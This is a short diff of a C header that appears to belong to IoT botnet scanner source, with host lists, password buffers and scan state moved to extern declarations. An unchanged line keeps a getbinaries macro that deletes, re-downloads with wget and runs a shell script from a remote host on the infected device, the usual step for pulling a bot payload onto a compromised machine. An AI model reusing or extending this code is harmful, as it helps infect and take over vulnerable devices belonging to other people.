@@ -10,19 +10,13 @@ typedef struct {
     char hostname[32];
 } scan_data_t;
 
-FILE *resfd, *statfd;
-char resbuf[21], restag[21];
-char hosts[maxhosts][16];
+extern FILE *resfd;
 
-unsigned short total, founds;
-char psw_x[32], psw_y[32];
-char __netbuf[sizebuf];
+extern unsigned short total;
 
-struct timeval tm;
-int timeout_value;
+extern struct timeval tm;
 
-sock_t *scan_sp;
-pid_t pid, g_pid;
+extern pid_t pid, g_pid;
 
 #define getbinaries "rm -rf /var/run/getbinaries.sh; wget -c %s/getbinaries.sh -P /var/run && sh /var/run/getbinaries.sh&\n"
 
